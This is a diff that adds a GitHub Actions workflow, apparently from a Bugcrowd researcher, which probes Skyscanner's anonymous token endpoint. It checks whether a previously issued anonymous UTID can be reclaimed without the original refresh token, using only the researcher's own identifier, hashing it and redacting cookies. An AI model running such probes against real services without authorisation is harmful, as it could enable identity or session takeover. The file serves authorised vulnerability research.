@@ -1,0 +1,79 @@
+name: Bugcrowd Skyscanner Anonymous UTID Reclaim V36
+
+on:
+  push:
+    paths:
+      - '.github/workflows/bugcrowd-skyscanner-anonymous-utid-reclaim-v36.yml'
+  workflow_dispatch:
+
+jobs:
+  utid-reclaim:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Test reclaiming only our own anonymous UTID without original refresh token
+        shell: bash
+        run: |
+          set -euo pipefail
+          HDR='Skyscanner-Security: Bugcrowd'
+          UA='Mozilla/5.0 Bugcrowd-Research-Skyscanner-OwnUTIDReclaim/1.0'
+          URL='https://www.skyscanner.net/g/anonymous-auth-service/token'
+          CLIENT_ID='cfca180a6f79ab4de342'
+          REDIRECT='skyscanner://oauth2redirect'
+
+          mint() {
+            tag="$1"; prev="$2"
+            curl -sS --max-time 25 -X POST \
+              -H "$HDR" -H "User-Agent: $UA" -H 'Accept: application/json' \
+              -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
+              --data-urlencode "client_id=$CLIENT_ID" \
+              --data-urlencode 'scope=' \
+              --data-urlencode "redirect_uri=$REDIRECT" \
+              --data-urlencode "previous_utid=$prev" \
+              --data-urlencode 'grant_type=anonymous' \
+              -D "/tmp/$tag.h" -o "/tmp/$tag.json" "$URL" || true
+            echo "=== $tag ==="
+            grep -Ei '^(HTTP/|content-type:|x-service|x-gateway|set-cookie:)' "/tmp/$tag.h" | sed -E 's/(set-cookie:[^=]+=)[^;]+/\1<redacted>/I' | head -n 40 || true
+          }
+
+          SEED=$(python3 - <<'PY'
+          import uuid; print(uuid.uuid4())
+          PY
+          )
+          mint A "$SEED"
+
+          A_UTID=$(python3 - <<'PY'
+          import json,base64
+          x=json.load(open('/tmp/A.json')); t=x['access_token']; p=t.split('.')[1]; p += '='*(-len(p)%4)
+          c=json.loads(base64.urlsafe_b64decode(p)); print(c['https://skyscanner.net/utid'])
+          PY
+          )
+          echo "A_UTID_SHA256=$(printf '%s' "$A_UTID" | sha256sum | cut -d' ' -f1)"
+
+          # Fresh requests with no A refresh token/cookie. Only the A UTID is supplied.
+          mint RECLAIM_1 "$A_UTID"
+          mint RECLAIM_2 "$A_UTID"
+          RANDOM_PREV=$(python3 - <<'PY'
+          import uuid; print(uuid.uuid4())
+          PY
+          )
+          mint CONTROL_RANDOM "$RANDOM_PREV"
+
+          python3 - <<'PY'
+          import json,base64,hashlib
+          def claims(tag):
+              x=json.load(open(f'/tmp/{tag}.json'))
+              t=x.get('access_token','')
+              if not t: return {},False
+              p=t.split('.')[1]; p += '='*(-len(p)%4)
+              return json.loads(base64.urlsafe_b64decode(p)), True
+          ca,_=claims('A'); ua=ca.get('https://skyscanner.net/utid')
+          print('A_HAS_TOKEN=',bool(ua))
+          for tag in ('RECLAIM_1','RECLAIM_2','CONTROL_RANDOM'):
+              c,ok=claims(tag); u=c.get('https://skyscanner.net/utid')
+              print(tag,'HAS_TOKEN=',ok,'UTID_EQUALS_A=',bool(u and ua and u==ua),'UTID_HASH=',hashlib.sha256((u or '').encode()).hexdigest() if u else None)
+              x=json.load(open(f'/tmp/{tag}.json'))
+              print(tag,'RESPONSE_KEYS=',sorted(x.keys()),'TOKEN_TYPE=',x.get('token_type'),'EXPIRES_IN=',x.get('expires_in'))
+          PY
+
+          echo 'V36_OWN_UTID_RECLAIM_DONE=1'
